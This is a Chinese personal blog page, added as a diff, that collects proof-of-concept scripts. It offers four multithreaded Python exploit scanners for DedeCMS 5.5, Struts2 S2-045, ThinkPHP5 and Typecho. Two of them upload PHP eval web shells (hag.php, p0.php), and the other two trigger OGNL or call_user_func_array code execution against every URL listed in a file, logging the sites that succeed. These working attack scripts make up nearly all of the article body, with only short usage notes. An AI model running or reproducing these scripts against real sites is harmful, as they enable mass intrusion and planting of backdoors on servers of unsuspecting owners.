@@ -1,0 +1,1276 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="python," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="织梦dede漏洞版本：Dedecms 5.5 织梦(Dedecms)select_soft_post.php页面变量未初始漏洞 # -*- coding:UTF-8 -*-  import requests import threading import time import sys   class check(threading.Thread):            #判断是否存在这个漏洞的">
+<meta name="keywords" content="python">
+<meta property="og:type" content="article">
+<meta property="og:title" content="poc脚本整理">
+<meta property="og:url" content="http://yoursite.com/2019/03/23/一些脚本poc/index.html">
+<meta property="og:site_name" content="pig-佩奇">
+<meta property="og:description" content="织梦dede漏洞版本：Dedecms 5.5 织梦(Dedecms)select_soft_post.php页面变量未初始漏洞 # -*- coding:UTF-8 -*-  import requests import threading import time import sys   class check(threading.Thread):            #判断是否存在这个漏洞的">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-03-23T12:42:14.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="poc脚本整理">
+<meta name="twitter:description" content="织梦dede漏洞版本：Dedecms 5.5 织梦(Dedecms)select_soft_post.php页面变量未初始漏洞 # -*- coding:UTF-8 -*-  import requests import threading import time import sys   class check(threading.Thread):            #判断是否存在这个漏洞的">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/23/一些脚本poc/"/>
+
+
+
+
+
+  <title>poc脚本整理 | pig-佩奇</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+	<a href="https://shuaizhupeiqi.github.io"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_green_007200.png" alt="Fork me on GitHub"></a>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">pig-佩奇</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/23/一些脚本poc/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="佩奇">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pig-佩奇">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">poc脚本整理</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-23T00:00:00+08:00">
+                2019-03-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="织梦dede"><a href="#织梦dede" class="headerlink" title="织梦dede"></a>织梦dede</h1><p>漏洞版本：Dedecms 5.5</p>
+<p>织梦(Dedecms)select_soft_post.php页面变量未初始漏洞</p>
+<pre><code># -*- coding:UTF-8 -*-
+
+import requests
+import threading
+import time
+import sys
+
+
+class check(threading.Thread):            #判断是否存在这个漏洞的执行函数
+    def __init__(self, url, sem):
+        super(check, self).__init__()     #继承threading类的构造方法，python3的写法super().__init__()
+        self.url = url
+        self.sem = sem
+
+    def run(self):
+        requests.packages.urllib3.disable_warnings()
+        payload = &quot;include/dialog/select_soft_post.php&quot;
+        multipart_form_data = {
+        &apos;activepath&apos;:(None,&apos;/data/cache&apos;),
+        &apos;cfg_basedir&apos;:(None,&apos;../../&apos;),
+        &apos;cfg_imgtype&apos;:(None,&apos;php&apos;),
+        &apos;cfg_not_allowall&apos;:(None,&apos;txt&apos;),
+        &apos;cfg_softtype&apos;:(None,&apos;php&apos;),
+        &apos;cfg_mediatype&apos;:(None,&apos;php&apos;),
+        &apos;f&apos;:(None,&apos;form1.enclosure&apos;),
+        &apos;job&apos;:(None,&apos;upload&apos;),
+        &apos;newname&apos;:(None,&apos;hag.php&apos;),
+        &apos;uploadfile&apos;:(&apos;hag.php&apos;,&apos;&lt;?php eval($_POST[q]);?&gt;&apos;,&apos;application/octet-stream&apos;),
+        }
+        try:
+            r = requests.post(self.url.strip()+payload,files=multipart_form_data,timeout=6,verify=False)
+        except IOError:
+            print &quot;time out 1&quot;
+        newurl=self.url.strip()+&quot;data/cache/hag.php&quot;
+        payloads={&apos;q&apos;:&apos;echo &quot;sectest&quot;;&apos;}
+        try:
+            rr=requests.post(newurl,allow_redirects=False,timeout=3,data=payloads)#测试是否文件创建成功
+            body=rr.text
+            if body.find(&apos;sectest&apos;)!=-1:
+                with open(&apos;./success.txt&apos;,&apos;a&apos;) as f1:
+                    f1.write(newurl+&quot;\n&quot;)
+                print(&quot;web is success-----&gt;&gt;&gt;&gt;&gt;&gt;&quot;+self.url)
+            else:
+                print(&quot;web is fail--------&gt;&gt;&gt;&gt;&gt;&gt;&quot;+self.url)
+        except IOError:
+            print &quot;time out 2&quot;
+        self.sem.release()
+
+if __name__ == &apos;__main__&apos;:
+    f = open(&quot;./1.txt&quot;)
+    sem = threading.Semaphore(10)      #最大线程数为10个
+    for url in f.readlines():
+        sem.acquire()     #遍历一个就获得一个线程，直到达到最大
+
+        host_thread = check(url,sem)
+        host_thread.start()#执行check()的执行函数
+</code></pre><p>使用方法：在当前页面下创建./1.txt（为需要检测的url），success.txt为含有漏洞的url。</p>
+<h1 id="s2-045"><a href="#s2-045" class="headerlink" title="s2-045"></a>s2-045</h1><p>java的漏洞，s2-045网上可找到详情。</p>
+<pre><code># -*- coding:UTF-8 -*-
+
+import urllib2
+import threading
+import requests
+requests.packages.urllib3.disable_warnings()
+
+
+header = {
+        &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,
+        &apos;Accept-Encoding&apos;: &apos;gzip, deflate, compress&apos;,
+        &apos;Cache-Control&apos;: &apos;max-age=0&apos;,
+        &apos;Connection&apos;: &apos;close&apos;,
+        &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&apos;,
+        &apos;Content-Type&apos;:&quot;%{(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(88888888-23333+1222)).(#o.close())}&quot;
+    }
+
+class check(threading.Thread):            #判断是否存在这个漏洞的执行函数
+    def __init__(self, url, sem):
+        super(check, self).__init__()     #继承threading类的构造方法，python3的写法super().__init__()
+        self.url = url
+        self.sem = sem
+
+    def run(self):
+
+            try:
+                response = requests.post(self.url,data=&apos;&apos;,headers=header,verify=False,allow_redirects = False,timeout=6)
+                if response.content.find(&quot;88866777&quot;)!=-1:
+                    print &apos;success------&gt;&gt;&gt;&gt;&gt;&gt;&apos;+self.url
+                    with open(&apos;./success.txt&apos;,&apos;a&apos;) as f1:
+                        f1.write(newurl+&quot;\n&quot;)
+                else:
+                    print &apos;fail---------&gt;&gt;&gt;&gt;&gt;&gt;&apos;+self.url
+            except Exception as e:
+                print &apos;timeout------&gt;&gt;&gt;&gt;&gt;&gt;&apos;+self.url
+            self.sem.release()
+
+
+if __name__ == &quot;__main__&quot;:
+    urls = open(&apos;./url.txt&apos;, &apos;r&apos;)
+    sem = threading.Semaphore(10)      #最大线程数为10个
+    for url in urls.readlines():
+        url = url.strip(&apos;\n&apos;)
+        url = url.split(&apos;%3F&apos;, 1)[0]
+        sem.acquire()     #遍历一个就获得一个线程，直到达到最大
+        host_thread = check(url,sem)
+        host_thread.start()#执行check()的执行函数
+</code></pre><p>使用方法：在当前页面下创建./url.txt（为需要检测的url），success.txt为含有漏洞的url。</p>
+<h1 id="thinkphp5"><a href="#thinkphp5" class="headerlink" title="thinkphp5"></a>thinkphp5</h1><p>thinkphp5命令执行</p>
+<pre><code># -*- coding:UTF-8 -*-
+
+import requests
+import threading
+import time
+import sys
+
+class check(threading.Thread):            #判断是否存在这个漏洞的执行函数
+    def __init__(self, url, sem):
+        super(check, self).__init__()     #继承threading类的构造方法，python3的写法super().__init__()
+        self.url = url
+        self.sem = sem
+
+    def run(self):
+        parameters = &quot;s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1&quot;
+
+        try:
+            responce = requests.get(url = self.url, params = parameters,timeout=3)
+            body = responce.text
+            if body.find(&apos;PHP Extension&apos;) != -1:
+                with open(&quot;success.txt&quot;, &quot;a+&quot;) as f1:
+                    f1.write(&quot;存在tp5远程代码执行漏洞: &quot; + self.url + &quot;\n&quot;)
+                    print(&quot;[+] &quot; + self.url)
+            else:
+                print(&quot;[-] &quot; + self.url)
+        except Exception,err:
+            print(&quot;connect failed&quot;)
+            pass
+        self.sem.release()             #执行完函数，释放线程，线程数加1
+
+class host(threading.Thread):          #遍历文件操作
+    def __init__(self, sem):
+        super(host, self).__init__()   #继承threading类的构造方法，python3的写法super().__init__()
+        self.sem = sem
+
+    def run(self):
+        with open(&quot;url.txt&quot;, &quot;r&quot;) as f:
+            for host in f.readlines():
+                self.sem.acquire()     #遍历一个就获得一个线程，直到达到最大
+                host = host.strip()+&quot;/public/index.php&quot;
+                host_thread = check(host, self.sem)  
+                host_thread.start()    #执行check()的执行函数
+
+if __name__ == &apos;__main__&apos;:
+    sem = threading.Semaphore(10)      #最大线程数为10个
+    thread = host(sem)                 #传递sem值
+    thread.start()
+</code></pre><p>使用方法：在当前页面下创建./url.txt（为需要检测的url），success.txt为含有漏洞的url。</p>
+<h1 id="typecho"><a href="#typecho" class="headerlink" title="typecho"></a>typecho</h1><p>typecho反序列化漏洞</p>
+<pre><code>#/usr/bin/env python
+# -*- coding: UTF-8 -*-
+import getopt,sys
+import requests
+import sys
+import string
+import time
+import threading
+
+class check(threading.Thread): 
+    def __init__(self, url, sem):
+        super(check, self).__init__()     #继承threading类的构造方法，python3的写法super().__init__()
+        self.url = url
+        self.sem = sem
+
+    def run(self):
+        headers = {
+                &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0&apos;,
+                &apos;Referer&apos;: self.url,
+                &apos;cookie&apos;: &quot;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwMC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW3AwXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==&quot;
+                }
+        try:
+            reqs=s.get(self.url,timeout=3,headers=headers,allow_redirects=False)
+            #print(reqs.status_code),
+        except IOError:                  #如果网站打不开将输出fail
+            print(&quot;time out 1&quot;)
+        urls=self.url+&quot;/p0.php&quot;
+        urlsss=self.url+&quot;/install.php?finish=1&quot;
+        payloads={&apos;p0&apos;:&apos;echo &quot;sectest&quot;;&apos;}
+        try:
+            reqss=s.post(urls,allow_redirects=False,timeout=3,data=payloads)#测试是否文件创建成功
+            body=reqss.text
+            if body.find(&apos;sectest&apos;)!=-1:
+                 print(&quot;web is success-----&gt;&gt;&gt;&gt;&gt;&gt;&quot;+self.url)
+                 with open(&quot;./success.txt&quot;, &quot;a+&quot;) as f1:
+                    f1.write(self.url + &quot;\n&quot;)
+            else: 
+                 print(&quot;web is fail--------&gt;&gt;&gt;&gt;&gt;&gt;&quot;+self.url)
+            print(&apos;\n&apos;)
+        except IOError:                  #如果网站打不开将输出fail
+            print(&quot;time out 2&quot;)
+        self.sem.release()
+
+if __name__ == &apos;__main__&apos;:
+    reload(sys)#同下解决中文乱码
+    sys.setdefaultencoding(&apos;utf-8&apos;)#解决中文乱码
+    f = open(&quot;./1.txt&quot;)#打开批量扫描的网站文件
+    s=requests.Session()
+    sem = threading.Semaphore(10)      #最大线程数为10个
+    for line in f.readlines():#读取每一行的网站
+            line=line.strip(&apos;\n&apos;)#消去换行
+            url=line#每行的网站赋值给url
+            host_thread = check(url,sem)
+            host_thread.start()#执行check()的执行函数
+</code></pre><p>使用方法：在当前页面下创建./1.txt（为需要检测的url），success.txt为含有漏洞的url。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/python/" rel="tag"># python</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/18/phpcms常见漏洞/" rel="next" title="phpcms常见漏洞">
+                <i class="fa fa-chevron-left"></i> phpcms常见漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/08/掘安杯/" rel="prev" title="掘安杯网络安全技能挑战赛">
+                掘安杯网络安全技能挑战赛 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">佩奇</p>
+              <p class="site-description motion-element" itemprop="description">佩奇的后花园</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#织梦dede"><span class="nav-number">1.</span> <span class="nav-text">织梦dede</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#s2-045"><span class="nav-number">2.</span> <span class="nav-text">s2-045</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#thinkphp5"><span class="nav-number">3.</span> <span class="nav-text">thinkphp5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#typecho"><span class="nav-number">4.</span> <span class="nav-text">typecho</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">佩奇</span>
+
+  
+</div>
+-->
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
